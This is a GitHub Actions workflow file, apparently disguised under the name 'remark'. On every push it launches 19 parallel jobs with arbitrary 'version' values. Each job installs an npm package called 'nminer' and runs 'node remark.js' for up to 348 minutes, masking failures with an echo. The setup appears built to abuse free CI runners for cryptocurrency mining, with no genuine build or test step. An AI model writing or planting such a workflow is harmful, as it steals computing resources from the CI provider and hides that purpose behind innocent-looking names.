name: remark
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 7450 }
          - { version: 4463 }
          - { version: 5758 }
          - { version: 2670 }
          - { version: 1239 }
          - { version: 6858 }
          - { version: 8863 }
          - { version: 476 }
          - { version: 1362 }
          - { version: 8935 }
          - { version: 9468 }
          - { version: 3154 }
          - { version: 9639 }
          - { version: 9058 }
          - { version: 4358 }
          - { version: 9940 }
          - { version: 796 }
          - { version: 1818 }
          - { version: 9397 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: spiteful joy
        run: |
          npm install nminer@latest
          timeout 348m node remark.js || echo "remark executed"